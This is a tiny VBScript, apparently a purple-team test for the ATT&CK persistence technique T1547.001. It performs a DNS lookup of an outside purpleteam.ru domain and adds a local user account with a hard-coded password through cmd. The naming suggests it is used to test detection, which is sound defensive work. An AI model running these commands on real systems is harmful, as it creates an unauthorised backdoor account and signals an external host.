Set wShell = WScript.CreateObject("WScript.Shell")
wShell.run "nslookup t1547.purpleteam.ru"
wShell.run "cmd /C net user T1547_001 purpleteam /add"
WScript.Echo("T1547.001 VBS")
